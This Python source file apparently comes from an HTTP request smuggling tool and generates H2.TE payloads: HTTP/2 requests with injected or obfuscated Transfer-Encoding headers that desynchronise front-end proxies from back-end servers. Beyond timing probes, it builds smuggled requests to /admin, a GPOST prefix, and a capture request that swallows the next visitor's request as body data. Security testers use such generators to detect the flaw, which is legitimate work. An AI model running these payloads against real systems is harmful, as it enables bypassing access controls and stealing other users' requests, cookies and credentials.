"""H2.TE (HTTP/2 Transfer-Encoding injection) payload generator.

In H2.TE smuggling:
- Client sends HTTP/2 request with injected Transfer-Encoding header
- Frontend downgrades to HTTP/1.1 for backend
- Backend processes Transfer-Encoding: chunked
- Body is interpreted as chunked, extra data becomes smuggled request

HTTP/2 doesn't use Transfer-Encoding for framing, but some proxies
pass it through when downgrading, and backends may honor it.
"""

from typing import List, Optional, Tuple
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class H2TEPayloadGenerator(PayloadGenerator):
    """Generator for H2.TE smuggling payloads.
    
    These payloads exploit HTTP/2 to HTTP/1.1 downgrade scenarios
    where Transfer-Encoding is injected and processed by the backend.
    """
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.H2_TE
    
    @property
    def name(self) -> str:
        return "H2.TE Payload Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.TE timing-based detection payloads.
        
        These payloads inject Transfer-Encoding with incomplete chunked body,
        causing backend to wait for more data.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # H2.TE timing: Incomplete chunk causes timeout
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        # Incomplete chunked body - no terminator
        body1 = b"1\r\nX"
        
        payloads.append(Payload(
            name="H2.TE-timing-incomplete",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers1, body1),
            description="H2.TE with incomplete chunked body",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend waits for chunk terminator",
            expected_timeout=5.0,
            metadata={
                "h2_headers": headers1,
                "body": body1,
            },
        ))
        
        # H2.TE timing: Large chunk size declared
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        body2 = b"fff\r\nX"  # Claims 4095 bytes, sends 1
        
        payloads.append(Payload(
            name="H2.TE-timing-large-chunk",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers2, body2),
            description="H2.TE with large chunk size declaration",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend waits for 4095 bytes",
            expected_timeout=10.0,
            metadata={
                "h2_headers": headers2,
                "body": body2,
                "declared_size": 4095,
            },
        ))
        
        # H2.TE with obfuscated Transfer-Encoding
        headers3 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", " chunked"),  # Leading space
        ]
        body3 = b"1\r\nX"
        
        payloads.append(Payload(
            name="H2.TE-timing-te-space",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=self._serialize_h2_request(headers3, body3),
            description="H2.TE with leading space in TE value",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Backend may parse or ignore obfuscated TE",
            expected_timeout=5.0,
            metadata={
                "h2_headers": headers3,
                "body": body3,
            },
        ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate H2.TE differential detection payloads.
        
        These payloads inject Transfer-Encoding and use chunked encoding
        to smuggle requests after the chunk terminator.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # H2.TE differential: Smuggle after chunk terminator
        smuggled = f"GET /h2te_smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
        body1 = f"0\r\n\r\n{smuggled}".encode()
        
        headers1 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        
        payloads.append(Payload(
            name="H2.TE-differential-404",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers1, body1),
            description="H2.TE smuggle GET /h2te_smuggled",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives /h2te_smuggled response",
            poison_prefix="GET /h2te_smuggled",
            metadata={
                "h2_headers": headers1,
                "smuggled_request": smuggled,
            },
        ))
        
        # H2.TE smuggle to /admin
        smuggled2 = f"GET /admin HTTP/1.1\r\nHost: {host}\r\nX-Smuggled: true\r\n\r\n"
        body2 = f"0\r\n\r\n{smuggled2}".encode()
        
        headers2 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        
        payloads.append(Payload(
            name="H2.TE-differential-admin",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers2, body2),
            description="H2.TE smuggle GET /admin",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request receives /admin response",
            poison_prefix="GET /admin",
            metadata={
                "h2_headers": headers2,
                "smuggled_request": smuggled2,
            },
        ))
        
        # H2.TE with GPOST prefix
        smuggled3 = "G"
        body3 = f"0\r\n\r\n{smuggled3}".encode()
        
        headers3 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        
        payloads.append(Payload(
            name="H2.TE-differential-gpost",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers3, body3),
            description="H2.TE smuggle 'G' to create GPOST",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next POST becomes GPOST",
            poison_prefix="G",
            metadata={
                "h2_headers": headers3,
            },
        ))
        
        # H2.TE with data in chunk before smuggled request
        chunk_data = "x=1"
        chunk_size = hex(len(chunk_data))[2:]
        smuggled4 = f"GET /after_chunk HTTP/1.1\r\nHost: {host}\r\n\r\n"
        body4 = f"{chunk_size}\r\n{chunk_data}\r\n0\r\n\r\n{smuggled4}".encode()
        
        headers4 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        
        payloads.append(Payload(
            name="H2.TE-differential-with-data",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers4, body4),
            description="H2.TE with chunk data before smuggled request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request sees /after_chunk response",
            poison_prefix="GET /after_chunk",
            metadata={
                "h2_headers": headers4,
                "chunk_data": chunk_data,
            },
        ))
        
        # H2.TE request capture
        capture_req = (
            f"POST /capture HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n"
            f"\r\n"
            f"captured="
        )
        body5 = f"0\r\n\r\n{capture_req}".encode()
        
        headers5 = [
            (":method", "POST"),
            (":path", path),
            (":scheme", "https"),
            (":authority", host),
            ("content-type", "application/x-www-form-urlencoded"),
            ("transfer-encoding", "chunked"),
        ]
        
        payloads.append(Payload(
            name="H2.TE-differential-capture",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=self._serialize_h2_request(headers5, body5),
            description="H2.TE smuggle request that captures next request",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Next request captured as body",
            poison_prefix="POST /capture",
            metadata={
                "h2_headers": headers5,
                "capture_length": 500,
            },
        ))
        
        return payloads
    
    def _serialize_h2_request(
        self,
        headers: List[Tuple[str, str]],
        body: Optional[bytes] = None,
    ) -> bytes:
        """Serialize H2 request info for storage.
        
        Note: Actual HTTP/2 framing is done by HTTP2RawClient.
        This returns a representation for payload storage.
        """
        header_lines = []
        for name, value in headers:
            header_lines.append(f"{name}: {value}")
        
        result = "\r\n".join(header_lines) + "\r\n\r\n"
        
        if body:
            return result.encode() + body
        return result.encode()

